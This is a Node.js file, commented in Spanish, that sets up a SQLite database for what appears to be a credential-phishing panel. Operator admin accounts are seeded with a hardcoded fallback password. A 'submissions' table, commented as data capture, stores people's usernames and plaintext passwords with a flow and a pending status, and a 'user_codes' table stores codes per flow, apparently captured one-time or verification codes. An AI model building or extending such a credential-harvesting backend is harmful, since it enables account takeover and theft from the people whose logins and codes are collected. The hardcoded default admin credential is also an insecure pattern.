import Database from "better-sqlite3";
import path from "path";
import dotenv from "dotenv";
import { hashSync } from "bcryptjs";

dotenv.config();

// Ubicación de la DB
const dbPath = path.join(process.cwd(), "data", "app.db");
const db = new Database(dbPath);

// Optimización Senior: Journaling en modo WAL para mejores escrituras concurrentes
db.pragma("journal_mode = WAL");

// 1. Tabla de Usuarios con índices para velocidad
db.prepare(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'admin',
    created_at TEXT NOT NULL
  )
`).run();

// Inicialización de Admin desde .env
const envAdminUser = process.env.ADMIN_USERNAME || "Devcrackpy";
const envAdminPassword = process.env.ADMIN_PASSWORD || "Dev15987532*";

const existingAdmin = db.prepare("SELECT * FROM users WHERE username = ?").get(envAdminUser);
if (!existingAdmin) {
  db.prepare("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)")
    .run(envAdminUser, hashSync(envAdminPassword, 10), "admin", new Date().toISOString());
}

// 2. Tabla de Submissions (Captura de datos)
db.prepare(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    flow TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    timestamp TEXT NOT NULL,
    server_timestamp TEXT NOT NULL
  )
`).run();

// 3. Gestión dinámica de columnas para user_codes
// Esto evita errores si decides añadir 'flow' o 'action' después
const tableInfo = db.prepare(`PRAGMA table_info(user_codes)`).all();
if (tableInfo.length === 0) {
  db.prepare(`
    CREATE TABLE user_codes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      code TEXT,
      flow TEXT,
      action TEXT,
      created_at TEXT NOT NULL
    )
  `).run();
} else {
  const columns = tableInfo.map(c => c.name);
  if (!columns.includes("flow")) db.prepare(`ALTER TABLE user_codes ADD COLUMN flow TEXT`).run();
  if (!columns.includes("action")) db.prepare(`ALTER TABLE user_codes ADD COLUMN action TEXT`).run();
}

export default db;